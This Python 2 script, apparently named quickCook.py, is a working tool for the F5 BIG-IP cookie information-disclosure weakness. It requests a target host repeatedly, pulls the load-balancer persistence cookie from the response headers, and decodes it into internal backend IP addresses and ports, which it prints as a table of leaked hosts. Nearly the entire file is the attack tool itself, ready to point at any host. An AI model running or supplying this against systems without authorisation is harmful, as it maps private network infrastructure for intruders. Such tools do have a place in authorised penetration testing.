# -*- coding: utf-8 -*- 
#import sys
import time
import requests
import argparse
import netaddr
from progress.bar import Bar# as Bar

requests.packages.urllib3.disable_warnings()
class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

parser = argparse.ArgumentParser(
					prog='quickCook.py',
					description=' [ F5 BIG-IP ] COOKIE INFORMATION DISCLOSURE ', 
					epilog='[+] Demo: quickCook.py --host 192.168.1.1 --cookie-name "BIGipServerPool_X" --req 50',
					version="0.2")

parser.add_argument('--host', 		 dest="HOST",  	help='Host',			required=True)
parser.add_argument('--ssl', 		 dest="SSL",  	help='use ssl',  		action="store_true")

parser.add_argument('--cookie-name', dest="COOK",  	help='Cookie Name',  	required=True)
parser.add_argument('--port', 		 dest="PORT",  	help='Port',			default=80)
parser.add_argument('--req', 		 dest="REQ",  	help='Total Request',	default=1)
parser.add_argument('--uri', 		 dest="URI",  	help='URI path',	   	default="index.html")

#cookie name
args	= 	parser.parse_args()

HST   	= 	args.HOST
xSSL 	=   args.SSL
port 	= 	args.PORT
cookie 	= 	args.COOK #  cookie name 
uPath 	= 	args.URI  # "index.html"
loop 	= 	int(args.REQ)


if xSSL:
	port = 443
	fullHost 		= 	"https://"+HST+":"+str(port)+"/"+uPath
else:
	fullHost 		= 	"http://"+HST+":"+str(port)+"/"+uPath

def makeReqHeaders(host):
	headers = {}
	
	headers["Host"] 			=  host
	headers["User-Agent"]		= "Mozilla/5.0 (X11; Linux x86_64; rv:52.1) Gecko/20100101 Firefox/52.0"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Content-Type"] 	= "text/html"	
	#headers["Cookie"] 	= "BIGipServerwpsegment8w-prdw-8080-pool=00000.123.123"	# por que no ?
	headers["Connection"] 		= "close"
	return headers


def getCookie(srchCookName):
	if xSSL:
		r1 			= 	requests.get(fullHost, headers=makeReqHeaders(HST), verify=False)
	else:
		r1 			= 	requests.get(fullHost, headers=makeReqHeaders(HST))

	headerSrv 	=   r1.headers["Set-Cookie"].split()#[3]

	for xCooks in range(0,len(headerSrv)):

		srvCook = headerSrv[xCooks].split("=")

		if srchCookName == srvCook[0]:
			decIp = srvCook[1][:-1]
			getIP = decIp[:-11]
			ipLeaked = str((netaddr.IPAddress(getIP)))
			fuck = ipLeaked.split(".")
			fuck.reverse()
			ip_final = ''
			count = 0

			for item in fuck:
				ip_final += item
				if count < 3:
					ip_final += '.'
					count += 1

			rawPort   	= str(srvCook[1].split(".")[1]) #str(srvCook).split(".")[0]
			cookieHex 	= hex(int(rawPort))[2:]
			portHex 	= (cookieHex[2:] + cookieHex[:2])
			portDec  	= int(portHex,16)

			portX = portDec

			leaked = Colors.WHITE+" | "+Colors.GREEN + decIp +Colors.WHITE+ " \t | "+Colors.ORANGE+ ip_final +Colors.GREEN+ " : "+Colors.BLUE+str(portX)+Colors.DEFAULT 
			
			return leaked
		else:
			return " | ----------------------------- | -------------------------"
			
print "\n"
print " [+] host/ip: \t\t"+HST
print " [+] Port: \t\t"+str(port)
print " [+] Cookie name: \t"+cookie
print " [+] Total Request: \t"+str(loop)


tblHead = '''
 +-------------------------------+---------------------------------------+
 | Cookie value \t\t |  < '''+Colors.ORANGE+'Host'+Colors.DEFAULT+''' > : < '''+Colors.BLUE+'Port'+Colors.DEFAULT+''' > \t\t | 
 +-------------------------------+---------------------------------------+'''
 #+------------------------

tblFoot = ''' +-------------------------------+---------------------------------------+
'''
print "\n"
bar = Bar(' [+] REQUEST', max=loop )#, suffix='%(percent)d%%')
nReq = []
for i in range(0,loop):
	bar.next()
	h3ader = getCookie(cookie)
	
	strHead = str(h3ader)
	# // ------------------------------------ //
	#if strHead == "None":
	#	h3ader = strHead
	

	time.sleep(.5)
	nReq.append(h3ader)
bar.finish()

listcook = set(nReq)
print tblHead

for ck in set(listcook):
	print ck

print tblFoot
